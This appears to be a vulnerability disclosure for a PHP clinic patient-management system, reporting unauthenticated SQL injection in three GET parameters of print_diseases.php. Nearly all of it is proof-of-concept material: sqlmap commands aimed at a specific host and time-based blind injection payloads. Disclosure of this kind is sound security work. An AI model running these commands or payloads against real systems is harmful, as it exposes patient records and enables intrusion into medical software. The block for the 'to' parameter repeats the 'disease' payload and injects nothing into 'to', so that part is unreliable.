# A Unauthenticated SQL injection vulnerability  was identified in SourceCodesters Clinic's Patient Management System - PHP

Affected Project: Sourcecodester Clinic's Patient Management System - PHP 2.0

Official Website: Sourcecodester Clinic's Patient Management System

Version: 2.0

vulnerable code: /print_diseases.php


POC: 
---

`sqlmap -u "http://192.168.95.115/print_diseases.php?from=1&to=1&disease=1" -p from`


```
---
Parameter: from (GET)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: from=1' AND (SELECT 8759 FROM (SELECT(SLEEP(5)))EuWn) AND 'NMcb'='NMcb&to=1&disease=1
---

```

---

`sqlmap -u "http://192.168.95.115/print_diseases.php?from=1&to=1&disease=1" -p disease`

```
---
Parameter: disease (GET)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: from=1&to=1&disease=1') AND (SELECT 4423 FROM (SELECT(SLEEP(5)))zAiU) AND ('FMCA'='FMCA
---
```

---

`sqlmap -u "http://192.168.95.115/print_diseases.php?from=1&to=1&disease=1" -p to `

```

---
Parameter: to (GET)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: from=1&to=1&disease=1') AND (SELECT 4423 FROM (SELECT(SLEEP(5)))zAiU) AND ('FMCA'='FMCA
---

```
